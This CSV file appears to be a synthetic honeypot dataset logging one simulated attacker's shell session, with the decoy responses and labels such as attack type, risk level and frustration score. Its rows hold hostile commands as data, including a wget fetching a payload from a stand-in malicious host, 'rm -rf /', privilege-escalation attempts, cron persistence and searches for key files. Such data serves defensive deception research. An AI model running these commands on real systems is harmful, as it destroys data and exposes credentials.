session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
1,0,script_kiddie,2025-05-24 23:37:48.717366,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,82,initial_recon,0.1,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,39.66560190268422,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:48.817366,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,83,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,39.76560190268422,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:48.917366,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,84,initial_recon,0.1,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,39.86560190268422,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.017366,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,85,initial_recon,0.1284120735274788,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,39.9940139762117,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.145778,whoami,user,reconnaissance,1,True,True,0,86,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,40.0940139762117,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.245778,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,87,initial_recon,0.2933752205886611,0.1,0.0,initial_recon,1,0,0,1,-8958916735605131775,40.38738919680036,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.539153,crontab -e,Command executed,persistence,3,True,True,0,88,initial_recon,0.1,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,40.48738919680036,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.639153,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,89,initial_recon,0.1,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,40.58738919680036,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:49.739153,crontab -e,Command executed,persistence,3,False,True,1,90,initial_recon,1.049166853580497,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,41.63655605038085,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:50.788320,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,91,initial_recon,0.2589030573705395,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,41.89545910775139,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:51.047223,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,92,initial_recon,0.8101323606865081,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,42.7055914684379,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:51.857355,whoami,user,reconnaissance,1,True,True,0,93,initial_recon,0.1,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,42.8055914684379,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:51.957355,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,94,initial_recon,0.2275123225194523,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,43.03310379095736,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:52.184868,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,95,initial_recon,0.5013349597414424,0.1,0.1,initial_recon,1,1,0,1,-8958916735605131775,43.5344387506988,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:52.686203,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,96,initial_recon,0.1030962277947945,0.1,2.775557561562892e-17,initial_recon,1,0,0,0,-8958916735605131775,43.63753497849359,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:52.789299,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,97,initial_recon,2.2740973491072523,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,45.91163232760085,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:55.063396,crontab -e,Command executed,persistence,3,False,True,2,98,initial_recon,0.7567810959654516,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,46.6684134235663,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:55.820177,sudo su,Command executed,privilege_escalation,5,True,True,1,99,initial_recon,0.1,0.1,0.4,initial_recon,1,0,1,1,-8958916735605131775,46.76841342356629,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:55.920177,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,100,initial_recon,0.366116880028401,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,47.1345303035947,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.286294,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,101,initial_recon,0.1,0.1,0.2,initial_recon,1,1,0,0,-8958916735605131775,47.234530303594696,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.386294,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,102,initial_recon,0.1089162387290241,0.1,0.1,initial_recon,1,0,0,0,-8958916735605131775,47.343446542323726,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.495211,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,103,initial_recon,0.1,0.1,2.775557561562892e-17,initial_recon,1,1,0,0,-8958916735605131775,47.44344654232372,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.595211,whoami,user,reconnaissance,1,False,True,1,104,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,47.54344654232372,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.695211,sudo su,Command executed,privilege_escalation,5,True,True,0,105,initial_recon,0.1015799469232098,0.1,0.2,initial_recon,1,0,1,1,-8958916735605131775,47.64502648924693,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.796790,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,106,initial_recon,0.1624942554316835,0.1,0.1,initial_recon,1,0,0,1,-8958916735605131775,47.80752074467861,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:56.959285,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,107,initial_recon,0.3293658123997897,0.1,0.3,initial_recon,1,0,0,0,-8958916735605131775,48.136886557078405,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:57.288651,sudo su,Permission denied,privilege_escalation,5,True,True,0,108,initial_recon,0.7567824309853605,0.1,0.2,initial_recon,1,0,1,1,-8958916735605131775,48.893668988063766,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:58.045433,sudo su,Command executed,privilege_escalation,5,False,True,1,109,initial_recon,0.336017722234903,0.1,0.3,initial_recon,1,0,1,1,-8958916735605131775,49.22968671029867,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:58.381451,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,110,initial_recon,0.1,0.1,0.5,initial_recon,1,0,0,0,-8958916735605131775,49.32968671029867,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:58.481451,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,111,initial_recon,0.1118800814649685,0.1,0.4,initial_recon,1,1,0,0,-8958916735605131775,49.441566791763634,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:58.593331,rm -rf /,Command executed,destruction,5,False,True,1,112,initial_recon,0.1,0.1,0.3,initial_recon,1,0,0,1,-8958916735605131775,49.54156679176364,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:58.693331,crontab -e,Command executed,persistence,3,True,True,0,113,initial_recon,0.4986671928682415,0.1,0.5,initial_recon,1,0,0,0,-8958916735605131775,50.04023398463188,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:59.191998,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,114,initial_recon,0.6984353243887704,0.1,0.4,initial_recon,1,0,0,0,-8958916735605131775,50.73866930902065,16.76279621070162
1,0,script_kiddie,2025-05-24 23:37:59.890433,whoami,user,reconnaissance,1,False,True,2,115,initial_recon,0.4316844175859309,0.1,0.6000000000000001,initial_recon,1,0,0,0,-8958916735605131775,51.17035372660658,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:00.322118,find / -name '*.key',Command not found,data_exfiltration,3,False,True,3,116,initial_recon,0.3886569229599156,0.1,0.8,initial_recon,1,0,0,0,-8958916735605131775,51.559010649566495,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:00.710775,sudo su,Command executed,privilege_escalation,5,False,True,4,117,initial_recon,8.54122286990984,0.1,1.0,initial_recon,1,0,1,1,-8958916735605131775,60.10023351947633,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:09.251998,rm -rf /,Command executed,destruction,5,False,True,5,118,initial_recon,2.156936604317288,0.1,1.2,initial_recon,1,0,0,1,-8958916735605131775,62.25717012379362,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:11.408934,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,4,119,initial_recon,2.6110931093560463,0.1,1.4,initial_recon,1,0,0,0,-8958916735605131775,64.86826323314968,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:14.020027,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,3,120,initial_recon,9.134677105064837,0.1,1.2999999999999998,initial_recon,1,1,0,1,-8958916735605131775,74.0029403382145,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:23.154704,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,2,121,initial_recon,6.973726012624772,0.1,1.1999999999999995,initial_recon,1,0,0,0,-8958916735605131775,80.97666635083928,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:30.128430,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,1,122,initial_recon,2.729904541709732,0.1,1.0999999999999996,initial_recon,1,0,0,0,-8958916735605131775,83.70657089254901,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:32.858335,crontab -e,Command executed,persistence,3,False,True,2,123,initial_recon,3.1277498081859347,0.1,0.9999999999999996,initial_recon,1,0,0,0,-8958916735605131775,86.83432070073495,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:35.986085,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,124,initial_recon,16.69350416379851,0.1,1.1999999999999995,initial_recon,1,0,0,0,-8958916735605131775,103.52782486453346,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:52.679589,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,125,initial_recon,7.217606635065221,0.1,1.0999999999999996,initial_recon,1,1,0,0,-8958916735605131775,110.74543149959868,16.76279621070162
1,0,script_kiddie,2025-05-24 23:38:59.897195,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,126,initial_recon,4.830937093975142,0.1,0.9999999999999996,initial_recon,1,0,0,0,-8958916735605131775,115.57636859357382,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:04.728133,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,127,initial_recon,6.105573059841801,0.1,1.1999999999999995,initial_recon,1,1,0,0,-8958916735605131775,121.68194165341562,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:10.833706,crontab -e,Command executed,persistence,3,False,True,1,128,initial_recon,9.076207697744854,0.1,1.0999999999999996,initial_recon,1,0,0,0,-8958916735605131775,130.75814935116048,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:19.909913,whoami,user,reconnaissance,1,False,True,2,129,initial_recon,6.2854757986561705,0.1,1.2999999999999996,initial_recon,1,0,0,0,-8958916735605131775,137.04362514981665,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:26.195389,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,3,130,initial_recon,7.87511802640083,0.1,1.4999999999999996,initial_recon,1,0,0,1,-8958916735605131775,144.91874317621748,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:34.070507,crontab -e,Command executed,persistence,3,False,True,4,131,initial_recon,2.608018826079364,0.1,1.6999999999999995,initial_recon,1,0,0,0,-8958916735605131775,147.52676200229683,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:36.678526,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,3,132,initial_recon,0.2949847966628283,0.1,1.8999999999999997,initial_recon,1,0,0,0,-8958916735605131775,147.82174679895965,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:36.973511,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,2,133,initial_recon,2.1361233999732714,0.1,1.7999999999999994,initial_recon,1,1,0,0,-8958916735605131775,149.95787019893294,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:39.109634,sudo su,Command executed,privilege_escalation,5,False,True,3,134,initial_recon,0.2065138711828155,0.1,1.6999999999999993,initial_recon,1,0,1,1,-8958916735605131775,150.16438407011574,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:39.316148,crontab -e,Command executed,persistence,3,False,True,4,135,initial_recon,0.9978600474992116,0.1,1.8999999999999992,initial_recon,1,0,0,0,-8958916735605131775,151.16224411761496,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:40.314008,whoami,"
Authentication required. Please enter credentials:",reconnaissance,1,False,True,5,136,initial_recon,1.6198222980351349,0.1,2.099999999999999,initial_recon,1,0,0,0,-8958916735605131775,152.7820664156501,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:41.933830,sudo su,Permission denied,privilege_escalation,5,False,True,6,137,initial_recon,0.4018335733770937,0.1,2.2999999999999994,initial_recon,1,0,1,1,-8958916735605131775,153.1838999890272,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:42.335664,sudo su,"
Authentication required. Please enter credentials:",privilege_escalation,5,False,True,7,138,initial_recon,8.528917507535285,0.1,2.7,initial_recon,1,0,1,1,-8958916735605131775,161.71281749656248,16.76279621070162
1,0,script_kiddie,2025-05-24 23:39:50.864581,find / -name '*.key',Command not found,data_exfiltration,3,False,True,8,139,initial_recon,10.042289746004093,0.1,2.9,initial_recon,1,0,0,0,-8958916735605131775,171.75510724256657,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:00.906871,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,7,140,initial_recon,3.571680220449152,0.1,3.1,initial_recon,1,1,0,0,-8958916735605131775,175.32678746301573,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:04.478551,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,6,141,initial_recon,0.2719510701651044,0.1,3.0,initial_recon,1,1,0,1,-8958916735605131775,175.59873853318084,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:04.750503,rm -rf /,Command executed,destruction,5,False,True,7,142,initial_recon,10.720145303777285,0.1,2.9,initial_recon,1,0,0,1,-8958916735605131775,186.3188838369581,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:15.470648,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,6,143,initial_recon,1.658245511084387,0.1,3.1,initial_recon,1,1,0,0,-8958916735605131775,187.9771293480425,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:17.128893,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,5,144,initial_recon,11.475873345586177,0.1,3.0,initial_recon,1,0,0,0,-8958916735605131775,199.45300269362863,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:28.604767,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,4,145,initial_recon,27.150547794273265,0.1,2.9,initial_recon,1,1,0,1,-8958916735605131775,226.60355048790197,16.76279621070162
1,0,script_kiddie,2025-05-24 23:40:55.755314,find / -name '*.key',Command not found,data_exfiltration,3,False,True,5,146,initial_recon,8.754886447045784,0.1,2.8,initial_recon,1,0,0,0,-8958916735605131775,235.3584369349477,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:04.510201,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,4,147,initial_recon,4.073991680817637,0.1,3.0,initial_recon,1,1,0,0,-8958916735605131775,239.43242861576536,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:08.584193,find / -name '*.key',Command not found,data_exfiltration,3,False,True,5,148,initial_recon,1.0879074922085958,0.1,2.9,initial_recon,1,0,0,0,-8958916735605131775,240.52033610797395,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:09.672100,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,4,149,initial_recon,17.992246357817358,0.1,3.1,initial_recon,1,0,0,0,-8958916735605131775,258.5125824657913,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:27.664346,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,3,150,initial_recon,1.1837261037954765,0.1,3.0,initial_recon,1,1,0,0,-8958916735605131775,259.6963085695868,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:28.848073,whoami,user,reconnaissance,1,True,True,2,151,initial_recon,1.6931810212876195,0.1,2.9,initial_recon,1,0,0,0,-8958916735605131775,261.3894895908744,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:30.541254,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,152,initial_recon,8.239803082303613,0.1,2.8,initial_recon,1,1,0,0,-8958916735605131775,269.62929267317804,16.76279621070162
1,0,script_kiddie,2025-05-24 23:41:38.781057,sudo su,"
Authentication required. Please enter credentials:",privilege_escalation,5,False,True,2,153,initial_recon,3.820555367314212,0.1,2.7,initial_recon,1,0,1,1,-8958916735605131775,273.4498480404922,16.76279621070162
